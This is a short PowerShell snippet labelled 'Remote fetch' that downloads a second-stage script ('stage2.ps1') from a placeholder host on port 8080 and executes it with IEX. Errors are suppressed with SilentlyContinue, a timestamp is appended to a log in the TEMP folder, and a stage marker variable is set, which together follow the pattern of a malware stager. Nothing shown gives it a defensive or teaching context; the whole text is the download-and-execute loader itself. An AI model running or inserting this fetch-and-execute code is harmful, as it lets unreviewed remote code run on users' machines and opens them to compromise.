
<# Remote fetch #> $TransferUrl = 'http://example.org:8080/stage2.ps1'; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $StageMarker = "stage-24"
